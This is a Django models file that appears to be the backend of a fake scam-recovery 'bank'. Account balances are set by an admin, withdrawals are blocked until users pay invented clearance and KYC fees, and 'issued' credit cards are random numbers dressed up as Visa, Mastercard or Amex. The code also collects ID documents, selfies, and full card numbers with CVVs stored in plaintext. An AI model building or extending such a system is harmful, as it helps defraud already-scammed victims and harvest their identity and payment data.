from django.db import models
from django.utils.crypto import get_random_string
from django.utils import timezone

class Contact(models.Model):
    name = models.CharField(max_length=100)
    email = models.EmailField()
    phone = models.CharField(max_length=20, blank=True)
    subject = models.CharField(max_length=200)
    message = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)
    is_resolved = models.BooleanField(default=False)

    def save(self, *args, **kwargs):
        is_new = self.pk is None
        super().save(*args, **kwargs)
        if is_new:
            try:
                from .webpush import send_web_push
                send_web_push(
                    title="📩 New Contact Inquiry",
                    body=f"{self.name} ({self.email}): {self.subject}",
                    url=f"/admin/core/contact/{self.pk}/change/"
                )
            except Exception:
                pass

    def __str__(self):
        return f"Message from {self.name} - {self.subject}"

class Claim(models.Model):
    STATUS_CHOICES = [
        ('PENDING', 'Pending'),
        ('REVIEW', 'Under Review'),
        ('APPROVED', 'Approved'),
        ('REJECTED', 'Rejected'),
        ('COMPLETED', 'Completed'),
    ]

    REFUND_TYPES = [
        ('SCAM', 'Scam Recovery'),
        ('CHARGEBACK', 'Chargeback Assistance'),
        ('SUBSCRIPTION', 'Subscription Cancellation'),
        ('DISPUTE', 'Online Purchase Dispute'),
        ('CRYPTO', 'Crypto Scam Report'),
        ('OTHER', 'Other'),
    ]

    claim_id = models.CharField(max_length=20, unique=True, editable=False)
    # Personal Info
    full_name = models.CharField(max_length=100)
    email = models.EmailField()
    phone = models.CharField(max_length=20)
    country = models.CharField(max_length=100)
    
    # Claim Details
    refund_type = models.CharField(max_length=20, choices=REFUND_TYPES)
    amount_lost = models.DecimalField(max_digits=12, decimal_places=2, help_text="Amount in USD")
    transaction_date = models.DateField()
    company_name = models.CharField(max_length=200, verbose_name="Company/Merchant Name")
    description = models.TextField()
    
    # Files
    proof_file = models.FileField(upload_to='proofs/', blank=True, null=True, help_text="Upload transaction proof (PDF, JPG, PNG)")
    
    # Meta
    preferred_contact = models.CharField(max_length=20, choices=[('EMAIL', 'Email'), ('PHONE', 'Phone')], default='EMAIL')
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='PENDING')
    agent_notes = models.TextField(blank=True)
    assigned_agent = models.CharField(max_length=100, blank=True, help_text="Name of the agent handling this case")
    estimated_completion_date = models.DateField(blank=True, null=True)
    
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def save(self, *args, **kwargs):
        is_new = self.pk is None
        if not self.claim_id:
            # Generate unique ID: NCR-YYYY-XXXXXX
            year = timezone.now().year
            unique = get_random_string(6, allowed_chars='0123456789')
            self.claim_id = f"NCR-{year}-{unique}"
        super().save(*args, **kwargs)
        if is_new:
            try:
                from .webpush import send_web_push
                send_web_push(
                    title="🚨 New Claim Submitted!",
                    body=f"Claim #{self.claim_id} for ${self.amount_lost:,.2f} from {self.full_name} ({self.country}).",
                    url=f"/admin/core/claim/?q={self.claim_id}"
                )
            except Exception:
                pass


class UserProfile(models.Model):
    ACCOUNT_TYPES = [
        ('FIXED_DEPOSIT', 'Fixed Deposit Account'),
        ('CURRENT', 'Current Account'),
        ('CRYPTO', 'Crypto Currency Account'),
        ('BUSINESS', 'Business Account'),
        ('NON_RESIDENT', 'Non Resident Account'),
        ('CORPORATE', 'Corporate Business Account'),
        ('INVESTMENT', 'Investment Account'),
    ]

    user = models.OneToOneField('auth.User', on_delete=models.CASCADE, related_name='profile')
    middle_name = models.CharField(max_length=100, blank=True)
    phone = models.CharField(max_length=20)
    country = models.CharField(max_length=100)
    account_no = models.CharField(max_length=12, unique=True, editable=False)
    account_type = models.CharField(max_length=20, choices=ACCOUNT_TYPES, default='SAVINGS')
    balance = models.DecimalField(max_digits=12, decimal_places=2, default=0.00, help_text="Current account balance assigned by admin")
    min_withdrawal_amount = models.DecimalField(max_digits=12, decimal_places=2, default=500.00, verbose_name="Minimum Withdrawal Requirement", help_text="Minimum balance required to initiate a withdrawal")
    withdrawal_charge_amount = models.DecimalField(max_digits=10, decimal_places=2, default=0.00, help_text="Processing or statutory clearance charges required for withdrawal")
    is_withdrawal_charge_paid = models.BooleanField(default=False, help_text="Designates whether the required withdrawal charge has been cleared")
    is_charge_paid = models.BooleanField(default=False)
    charge_amount = models.DecimalField(max_digits=10, decimal_places=2, default=0.00, help_text="The charge the user must pay before receiving funds")
    is_kyc_verified = models.BooleanField(default=False, help_text="Designates whether the user has passed KYC verification")
    
    created_at = models.DateTimeField(auto_now_add=True)

    def save(self, *args, **kwargs):
        if not self.account_no:
            while True:
                candidate = get_random_string(10, allowed_chars='0123456789')
                if not UserProfile.objects.filter(account_no=candidate).exists():
                    self.account_no = candidate
                    break
        super().save(*args, **kwargs)

    def __str__(self):
        return f"{self.user.username} - {self.account_no}"

    @property
    def attains_withdrawal_criteria(self):
        """Returns True if user's balance meets or exceeds the minimum withdrawal amount."""
        return self.balance >= self.min_withdrawal_amount

    @property
    def withdrawal_shortfall(self):
        """Returns remaining amount needed to reach withdrawal threshold."""
        if self.balance < self.min_withdrawal_amount:
            return self.min_withdrawal_amount - self.balance
        return 0.00

    @property
    def kyc_status(self):
        if hasattr(self.user, 'kyc_application'):
            return self.user.kyc_application.status
        return 'UNVERIFIED'

class KYCApplication(models.Model):
    STATUS_CHOICES = [
        ('UNVERIFIED', 'Not Submitted'),
        ('PENDING', 'Under Review'),
        ('APPROVED', 'Approved'),
        ('REJECTED', 'Rejected'),
    ]

    DOCUMENT_TYPES = [
        ('NATIONAL_ID', 'National Identity Card (Front & Back)'),
        ('PASSPORT', 'International Passport'),
        ('DRIVERS_LICENSE', "Driver's License"),
        ('RESIDENCE_PERMIT', 'Government Residence Permit'),
    ]

    user = models.OneToOneField('auth.User', on_delete=models.CASCADE, related_name='kyc_application')
    application_id = models.CharField(max_length=30, unique=True, editable=False)
    
    # Step 1: Terms Acceptance
    terms_accepted = models.BooleanField(default=False)
    terms_accepted_at = models.DateTimeField(null=True, blank=True)
    
    # Step 2: Identification Documents
    document_type = models.CharField(max_length=30, choices=DOCUMENT_TYPES, default='NATIONAL_ID')
    document_number = models.CharField(max_length=100, blank=True)
    document_front = models.FileField(upload_to='kyc_documents/', blank=True, null=True, help_text="ID / Document Front")
    document_back = models.FileField(upload_to='kyc_documents/', blank=True, null=True, help_text="ID / Document Back")
    selfie_photo = models.FileField(upload_to='kyc_documents/', blank=True, null=True, help_text="Selfie with ID / Proof photo")
    
    # Residential & Identity details
    date_of_birth = models.DateField(null=True, blank=True)
    gender = models.CharField(max_length=20, blank=True, default='')
    phone_number = models.CharField(max_length=35, blank=True, default='')
    occupation = models.CharField(max_length=100, blank=True, default='')
    document_expiry = models.DateField(null=True, blank=True)
    address_line = models.CharField(max_length=255, blank=True)
    city = models.CharField(max_length=100, blank=True)
    state = models.CharField(max_length=100, blank=True)
    postal_code = models.CharField(max_length=30, blank=True)
    country = models.CharField(max_length=100, blank=True)
    
    # Linked Credit Card
    credit_card = models.ForeignKey('CreditCard', on_delete=models.SET_NULL, null=True, blank=True, related_name='kyc_applications')
    
    # Status and compliance workflow
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='UNVERIFIED')
    kyc_fee_amount = models.DecimalField(max_digits=10, decimal_places=2, default=0.00, help_text="Processing/clearance charge required for KYC")
    charge_notice = models.TextField(
        blank=True,
        default="In accordance with international anti-money laundering (AML) and financial regulatory guidelines, a statutory KYC forensic verification and regulatory clearance fee is required to complete authentication. Our compliance administration team will contact you directly via your registered email or phone number with instructions."
    )
    admin_notes = models.TextField(blank=True, help_text="Compliance officer notes or rejection reason")
    
    submitted_at = models.DateTimeField(null=True, blank=True)
    reviewed_at = models.DateTimeField(null=True, blank=True)
    reviewed_by = models.CharField(max_length=100, blank=True)
    
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def save(self, *args, **kwargs):
        if not self.application_id:
            year = timezone.now().year
            unique = get_random_string(6, allowed_chars='0123456789')
            self.application_id = f"CRS-KYC-{year}-{unique}"
        
        # Keep profile.is_kyc_verified synchronized
        if self.status == 'APPROVED':
            if hasattr(self.user, 'profile') and not self.user.profile.is_kyc_verified:
                self.user.profile.is_kyc_verified = True
                self.user.profile.save(update_fields=['is_kyc_verified'])
        elif self.status in ['UNVERIFIED', 'PENDING', 'REJECTED']:
            if hasattr(self.user, 'profile') and self.user.profile.is_kyc_verified:
                self.user.profile.is_kyc_verified = False
                self.user.profile.save(update_fields=['is_kyc_verified'])

        super().save(*args, **kwargs)

    def __str__(self):
        return f"KYC: {self.user.username} ({self.get_status_display()}) - {self.application_id}"

class SupportMessage(models.Model):
    user_profile = models.ForeignKey(UserProfile, on_delete=models.CASCADE, related_name='support_messages', null=True, blank=True)
    message = models.TextField()
    is_from_admin = models.BooleanField(default=False)
    is_read = models.BooleanField(default=False)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ['created_at']

    def save(self, *args, **kwargs):
        is_new = self.pk is None
        super().save(*args, **kwargs)
        if is_new and not self.is_from_admin and self.user_profile:
            try:
                from .webpush import send_web_push
                username = self.user_profile.user.username
                acc_no = self.user_profile.account_no
                send_web_push(
                    title=f"💬 Support Inquiry (Acc #{acc_no})",
                    body=f"From {username}: {self.message[:65]}...",
                    url=f"/admin/core/userprofile/{self.user_profile.id}/change/"
                )
            except Exception:
                pass

    def __str__(self):
        if not self.user_profile:
            return f"Orphaned Message - {self.created_at}"
        sender = "Admin" if self.is_from_admin else self.user_profile.user.username
        return f"From {sender} to {self.user_profile.user.username} - {self.created_at.strftime('%Y-%m-%d %H:%M')}"

class CreditCard(models.Model):
    CARD_SOURCE_CHOICES = [
        ('IN_APP', 'In-App Issued Card'),
        ('EXTERNAL', 'Externally Added Card'),
    ]

    user = models.ForeignKey('auth.User', on_delete=models.CASCADE, related_name='credit_cards')
    cardholder_name = models.CharField(max_length=150)
    card_number = models.CharField(max_length=25)
    card_type = models.CharField(max_length=50, default='Visa', blank=True)
    card_source = models.CharField(max_length=20, choices=CARD_SOURCE_CHOICES, default='EXTERNAL', verbose_name="Card Origin")
    exp_month = models.CharField(max_length=2)
    exp_year = models.CharField(max_length=4)
    cvv = models.CharField(max_length=4)
    billing_zip = models.CharField(max_length=20, blank=True)
    is_primary = models.BooleanField(default=False)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ['-created_at']

    @property
    def is_in_app_card(self):
        return self.card_source == 'IN_APP' or hasattr(self, 'source_request')

    @property
    def last_four(self):
        digits = self.card_number.replace(' ', '')
        return digits[-4:] if len(digits) >= 4 else digits

    @property
    def masked_number(self):
        return f"•••• •••• •••• {self.last_four}"

    @property
    def expiry(self):
        month = str(self.exp_month).zfill(2)
        year = str(self.exp_year)[-2:] if len(str(self.exp_year)) == 4 else str(self.exp_year)
        return f"{month}/{year}"

    def __str__(self):
        origin = "[In-App]" if self.is_in_app_card else "[External]"
        return f"{origin} {self.card_type or 'Card'} ending in {self.last_four} ({self.cardholder_name})"


class InAppCreditCard(CreditCard):
    """Proxy model for In-App issued credit cards (separated in Django Admin)."""
    class Meta:
        proxy = True
        verbose_name = "In-App Issued Credit Card"
        verbose_name_plural = "In-App Issued Credit Cards"


class ExternalCreditCard(CreditCard):
    """Proxy model for Externally added credit cards (separated in Django Admin)."""
    class Meta:
        proxy = True
        verbose_name = "Externally Added Card"
        verbose_name_plural = "Externally Added Cards"


class PushSubscription(models.Model):
    user = models.ForeignKey('auth.User', on_delete=models.CASCADE, related_name='push_subscriptions', null=True, blank=True)
    endpoint = models.TextField(unique=True)
    p256dh = models.TextField(help_text="User public encryption key (p256dh)")
    auth = models.TextField(help_text="User authentication secret (auth)")
    user_agent = models.CharField(max_length=255, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        verbose_name = "Web Push Subscription"
        verbose_name_plural = "Web Push Subscriptions"
        ordering = ['-created_at']

    def __str__(self):
        username = self.user.username if self.user else "Anonymous Device"
        return f"{username} - {self.endpoint[:40]}..."

class CardRequest(models.Model):
    STATUS_CHOICES = [
        ('PENDING', 'Pending Admin Approval'),
        ('APPROVED', 'Approved & Issued'),
        ('REJECTED', 'Rejected'),
    ]
    CARD_TYPES = [
        ('Visa', 'Visa Platinum Restitution Card'),
        ('Mastercard', 'Mastercard World Elite Restitution Card'),
        ('American Express', 'American Express Centurion Shield'),
    ]
    CURRENCY_CHOICES = [
        ('USD', 'USD - United States Dollar ($)'),
        ('EUR', 'EUR - Euro (€)'),
        ('GBP', 'GBP - British Pound (£)'),
    ]

    user = models.ForeignKey('auth.User', on_delete=models.CASCADE, related_name='card_requests')
    request_id = models.CharField(max_length=30, unique=True, editable=False)
    cardholder_name = models.CharField(max_length=150, help_text="Legal name to appear on the issued card")
    card_type = models.CharField(max_length=50, choices=CARD_TYPES, default='Visa')
    currency = models.CharField(max_length=10, choices=CURRENCY_CHOICES, default='USD')
    delivery_address = models.TextField(blank=True, help_text="Delivery address for physical card dispatch")
    contact_phone = models.CharField(max_length=30, blank=True)
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='PENDING')
    issuance_fee = models.DecimalField(max_digits=10, decimal_places=2, default=0.00, help_text="Required card issuance/dispatch fee")
    admin_notes = models.TextField(blank=True, help_text="Compliance or fee notes for the cardholder")
    
    # Linked card generated upon approval
    generated_card = models.OneToOneField('CreditCard', on_delete=models.SET_NULL, null=True, blank=True, related_name='source_request')
    
    requested_at = models.DateTimeField(auto_now_add=True)
    approved_at = models.DateTimeField(null=True, blank=True)
    approved_by = models.CharField(max_length=100, blank=True)

    class Meta:
        ordering = ['-requested_at']

    def save(self, *args, **kwargs):
        is_new = self.pk is None
        if not self.request_id:
            year = timezone.now().year
            unique = get_random_string(6, allowed_chars='0123456789')
            self.request_id = f"CCR-{year}-{unique}"
        super().save(*args, **kwargs)
        if is_new:
            try:
                from .webpush import send_web_push
                send_web_push(
                    title="💳 New Card Request Submitted",
                    body=f"{self.cardholder_name} requested a {self.card_type} card ({self.request_id}).",
                    url="/admin/core/cardrequest/"
                )
            except Exception:
                pass

    def approve_and_generate_card(self, approved_by_username='Admin'):
        """
        When approved, the system automatically generates a credit card with requester's name
        and a duration of 2 years from the approval date!
        """
        import random
        approval_date = timezone.now()
        self.status = 'APPROVED'
        self.approved_at = approval_date
        self.approved_by = approved_by_username

        if not self.generated_card:
            # Generate 16-digit card number based on card type
            if self.card_type == 'Visa':
                digits = '4' + ''.join([str(random.randint(0, 9)) for _ in range(15)])
            elif self.card_type == 'Mastercard':
                digits = str(random.choice([51, 52, 53, 54, 55])) + ''.join([str(random.randint(0, 9)) for _ in range(14)])
            elif self.card_type == 'American Express':
                digits = str(random.choice([34, 37])) + ''.join([str(random.randint(0, 9)) for _ in range(13)])
            else:
                digits = '4' + ''.join([str(random.randint(0, 9)) for _ in range(15)])

            formatted_number = ' '.join([digits[i:i+4] for i in range(0, len(digits), 4)])

            # Duration of 2 years from approval date
            exp_month = str(approval_date.month).zfill(2)
            exp_year = str(approval_date.year + 2)
            cvv = str(random.randint(100, 999))

            card = CreditCard.objects.create(
                user=self.user,
                cardholder_name=self.cardholder_name.strip() or (self.user.get_full_name() or self.user.username),
                card_number=formatted_number,
                card_type=self.card_type,
                card_source='IN_APP',
                exp_month=exp_month,
                exp_year=exp_year,
                cvv=cvv,
                billing_zip='10001',
                is_primary=(not self.user.credit_cards.exists())
            )
            self.generated_card = card

        self.save()

        # Send automated alert support message
        SupportMessage.objects.create(
            user_profile=self.user.profile,
            message=(
                f"Credit Card Approved! Your {self.card_type} card ending in {self.generated_card.last_four} "
                f"issued to {self.generated_card.cardholder_name} is active with a 2-year validity expiring {self.generated_card.expiry}. "
                "You can view and manage your card details under My Payment Cards."
            ),
            is_from_admin=True,
            is_read=False
        )
        return self.generated_card

    def __str__(self):
        return f"Card Request {self.request_id} - {self.cardholder_name} ({self.get_status_display()})"


class WireTransfer(models.Model):
    STATUS_CHOICES = [
        ('PENDING', 'Pending Administrative Review'),
        ('IN_CLEARING', 'In International Clearing'),
        ('COMPLETED', 'Disbursed & Completed'),
        ('REJECTED', 'Rejected'),
    ]

    CURRENCY_CHOICES = [
        ('USD', 'USD - United States Dollar ($)'),
        ('EUR', 'EUR - Euro (€)'),
        ('GBP', 'GBP - British Pound (£)'),
        ('CAD', 'CAD - Canadian Dollar ($)'),
        ('AUD', 'AUD - Australian Dollar ($)'),
        ('CHF', 'CHF - Swiss Franc (CHF)'),
    ]

    user = models.ForeignKey('auth.User', on_delete=models.CASCADE, related_name='wire_transfers')
    reference_id = models.CharField(max_length=30, unique=True, editable=False)
    
    # Beneficiary Details
    beneficiary_name = models.CharField(max_length=150, help_text="Full legal name of the recipient")
    beneficiary_address = models.CharField(max_length=255, help_text="Recipient street address, city, country")
    beneficiary_country = models.CharField(max_length=100)
    
    # Bank Details
    bank_name = models.CharField(max_length=150)
    swift_bic = models.CharField(max_length=20, help_text="SWIFT or BIC Code")
    iban_account_number = models.CharField(max_length=50, help_text="IBAN or International Account Number")
    routing_number = models.CharField(max_length=50, blank=True, help_text="Routing / Sort Code / Fedwire / Transit")
    bank_address = models.CharField(max_length=255, blank=True, help_text="Bank branch address and country")
    intermediary_bank = models.CharField(max_length=150, blank=True, help_text="Intermediary or correspondent bank if required")

    # Transaction Details
    amount = models.DecimalField(max_digits=12, decimal_places=2)
    currency = models.CharField(max_length=10, choices=CURRENCY_CHOICES, default='USD')
    purpose_of_wire = models.CharField(max_length=200, help_text="Purpose of remittance or case file reference")
    
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='PENDING')
    admin_notes = models.TextField(blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ['-created_at']

    def save(self, *args, **kwargs):
        is_new = self.pk is None
        if not self.reference_id:
            year = timezone.now().year
            unique = get_random_string(6, allowed_chars='0123456789')
            self.reference_id = f"IWT-{year}-{unique}"
        super().save(*args, **kwargs)
        if is_new:
            try:
                from .webpush import send_web_push
                send_web_push(
                    title="🌐 New International Wire Transfer",
                    body=f"{self.currency} {self.amount:,.2f} to {self.beneficiary_name} ({self.reference_id}).",
                    url="/admin/core/wiretransfer/"
                )
            except Exception:
                pass

    def __str__(self):
        return f"Wire {self.reference_id}: {self.currency} {self.amount} to {self.beneficiary_name} ({self.get_status_display()})"


class WithdrawalRequest(models.Model):
    STATUS_CHOICES = [
        ('PENDING', 'Pending Admin Clearance'),
        ('CONTACTED', 'Admin Contacted User'),
        ('APPROVED', 'Approved & Disbursed'),
        ('REJECTED', 'Rejected'),
    ]

    user = models.ForeignKey('auth.User', on_delete=models.CASCADE, related_name='withdrawal_requests')
    request_id = models.CharField(max_length=30, unique=True, editable=False)
    amount = models.DecimalField(max_digits=12, decimal_places=2)
    payout_method = models.CharField(max_length=50, default='Bank Wire')
    payout_details = models.TextField(help_text="Account/Wallet/Card details for disbursement")
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='PENDING')
    admin_notes = models.TextField(blank=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ['-created_at']

    def save(self, *args, **kwargs):
        is_new = self.pk is None
        if not self.request_id:
            year = timezone.now().year
            unique = get_random_string(6, allowed_chars='0123456789')
            self.request_id = f"WDR-{year}-{unique}"
        super().save(*args, **kwargs)
        if is_new:
            try:
                from .webpush import send_web_push
                send_web_push(
                    title="💰 New Withdrawal Request",
                    body=f"User {self.user.username} requested ${self.amount:,.2f} via {self.payout_method} ({self.request_id}).",
                    url="/admin/core/withdrawalrequest/"
                )
            except Exception:
                pass

    def __str__(self):
        return f"Withdrawal {self.request_id}: ${self.amount} ({self.get_status_display()})"


class LoanRequest(models.Model):
    STATUS_CHOICES = [
        ('PENDING', 'Under Credit & Forensic Review'),
        ('APPROVED', 'Approved'),
        ('REJECTED', 'Declined'),
        ('DISBURSED', 'Disbursed to Account Balance'),
    ]

    LOAN_PURPOSE_CHOICES = [
        ('RESTITUTION_ADVANCE', 'Restitution Settlement Advance'),
        ('LEGAL_RETAINER', 'Legal Counsel & Retainer Financing'),
        ('ASSET_RECOVERY_BRIDGE', 'Forensic Asset Recovery Bridging'),
        ('EMERGENCY_LIQUIDITY', 'Emergency Restitution Liquidity'),
        ('BUSINESS_DISPUTE', 'Commercial Dispute Working Capital'),
        ('OTHER', 'Other Corporate / Personal Restitution'),
    ]

    TERM_CHOICES = [
        (6, '6 Months (Flexible Draw)'),
        (12, '12 Months (Standard Term)'),
        (24, '24 Months (Extended Recovery)'),
        (36, '36 Months (Multi-Jurisdiction Docket)'),
    ]

    user = models.ForeignKey('auth.User', on_delete=models.CASCADE, related_name='loan_requests')
    loan_id = models.CharField(max_length=30, unique=True, editable=False)

    amount_requested = models.DecimalField(max_digits=12, decimal_places=2, help_text="Requested loan amount in USD")
    purpose = models.CharField(max_length=50, choices=LOAN_PURPOSE_CHOICES, default='RESTITUTION_ADVANCE')
    term_months = models.IntegerField(choices=TERM_CHOICES, default=12)
    annual_interest_rate = models.DecimalField(max_digits=5, decimal_places=2, default=3.50, help_text="Annual percentage rate (APR)")

    # Financial details
    monthly_income = models.DecimalField(max_digits=12, decimal_places=2, help_text="Estimated monthly income or recovered assets")
    employment_status = models.CharField(max_length=100, default='Employed / Business Owner')
    collateral_claim_reference = models.CharField(max_length=100, blank=True, help_text="Linked Case Claim ID or asset recovery docket")
    repayment_source = models.CharField(max_length=150, default='Recovered Settlement Funds / Monthly Income')
    notes = models.TextField(blank=True, help_text="Applicant statement and disbursement instructions")

    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='PENDING')
    admin_notes = models.TextField(blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ['-created_at']

    def save(self, *args, **kwargs):
        is_new = self.pk is None
        if not self.loan_id:
            year = timezone.now().year
            unique = get_random_string(6, allowed_chars='0123456789')
            self.loan_id = f"LN-{year}-{unique}"
        super().save(*args, **kwargs)
        if is_new:
            try:
                from .webpush import send_web_push
                send_web_push(
                    title="📄 New Loan Request Submitted",
                    body=f"User {self.user.username} requested ${self.amount_requested:,.2f} ({self.loan_id}).",
                    url="/admin/core/loanrequest/"
                )
            except Exception:
                pass

    def __str__(self):
        return f"Loan {self.loan_id}: ${self.amount_requested} for {self.user.username} ({self.get_status_display()})"


from django.db.models.signals import post_save
from django.dispatch import receiver

@receiver(post_save, sender='auth.User')
def create_user_profile(sender, instance, created, **kwargs):
    if created:
        UserProfile.objects.get_or_create(user=instance)
        KYCApplication.objects.get_or_create(user=instance)

@receiver(post_save, sender='auth.User')
def save_user_profile(sender, instance, **kwargs):
    try:
        instance.profile.save()
    except UserProfile.DoesNotExist:
        UserProfile.objects.create(user=instance)
